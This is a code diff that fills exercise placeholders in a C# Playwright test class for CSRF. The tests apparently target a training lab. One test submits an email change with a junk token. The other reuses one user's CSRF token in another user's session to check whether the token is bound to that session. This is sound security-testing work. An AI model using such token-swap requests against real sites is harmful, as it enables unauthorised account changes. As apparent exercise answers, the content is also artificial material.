@@ -40,7 +40,10 @@ internal class CSRFTesting : PageTest
 
         await LoginToAccount(Page, Username_A, Password_A);
 
-        //= Your code here =//
+        await Page.Locator("[name=csrf]").EvaluateAsync("node => node.type = 'text'");
+        await Page.Locator("[name=csrf]").FillAsync("jibiasfepoijasfd");
+        await Page.Locator("[name=email]").FillAsync(targetEmail);
+        await Page.ClickAsync("xpath=/html/body/div[2]/section/div/div/form/button");
 
         var errorMessage = await Page.Locator("xpath=/html/body/pre").InnerTextAsync();
 
@@ -59,7 +62,14 @@ internal class CSRFTesting : PageTest
         await LoginToAccount(wienerPage, Username_A, Password_A);
         await LoginToAccount(carlosPage, Username_B, Password_B);
 
-        //= Your code here =//
+        await wienerPage.Locator("[name=csrf]").EvaluateAsync("node => node.type = 'text'");
+        var csrfTokenWiener = await wienerPage.Locator("[name=csrf]").InputValueAsync();
+
+        await carlosPage.Locator("[name=csrf]").EvaluateAsync("node => node.type = 'text'");
+        await carlosPage.Locator("[name=csrf]").FillAsync(csrfTokenWiener);
+        await carlosPage.Locator("[name=email]").FillAsync(targetEmail);
+
+        await carlosPage.ClickAsync("xpath=/html/body/div[2]/section/div/div/form/button");
 
         var setEmail = await carlosPage.Locator("xpath=/html/body/div[2]/section/div/div/p[2]").InnerTextAsync();
 
